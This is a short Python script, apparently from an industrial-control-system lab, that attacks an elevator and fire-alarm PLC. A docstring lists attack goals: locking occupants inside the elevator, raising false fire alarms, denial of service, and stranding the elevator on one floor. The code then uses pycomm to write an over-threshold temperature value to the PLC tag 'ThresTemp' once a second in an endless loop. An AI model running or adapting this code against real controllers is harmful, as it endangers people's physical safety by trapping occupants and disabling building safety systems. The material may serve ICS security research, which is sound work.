"""Elevator fire alarm system attack :
 1 If moving =true is detected and moving is set to true from now on, the person in the elevator will be locked in the elevator; 
 2 Change the temperature, so that the fire alarm,DOS attack, elevator can not run normally; 
 3 Record the last target floor. If the elevator is still moving when the last target floor is reached,anomaly Behavior; 
 4 Repeatedly trigger the elevator button on the first floor, and set the stair level to 2 all the time. Expectation: The elevator has been stopped on the first floor, and people on the second floor cannot use it
"""

# 2 attack

import time
from pycomm.ab_comm.clx import Driver as ClxDriver

PLC_IPS = {
    'plc1': '192.168.1.151',
}


def attack_plc_temperature(plc_ip, tag_name, attack_value, tag_type):
    plc = ClxDriver()
    if plc.open(plc_ip):
        while True:
            try:
                # Write the high temperature value to trigger the fire alarm
                print(plc.write_tag(tag_name, attack_value, tag_type))
                time.sleep(1)  # Set the write interval to simulate a DOS attack
            except Exception as e:
                print("Error:", e)
                break
        plc.close()
    else:
        print("Unable to open", plc_ip)

def main():
    # Attack the PLC's temperature label and set the temperature to a value higher than MAX TEMP, such as 50
    attack_plc_temperature(PLC_IPS['plc1'], 'ThresTemp', 50, 'REAL')

if __name__ == '__main__':
    main()
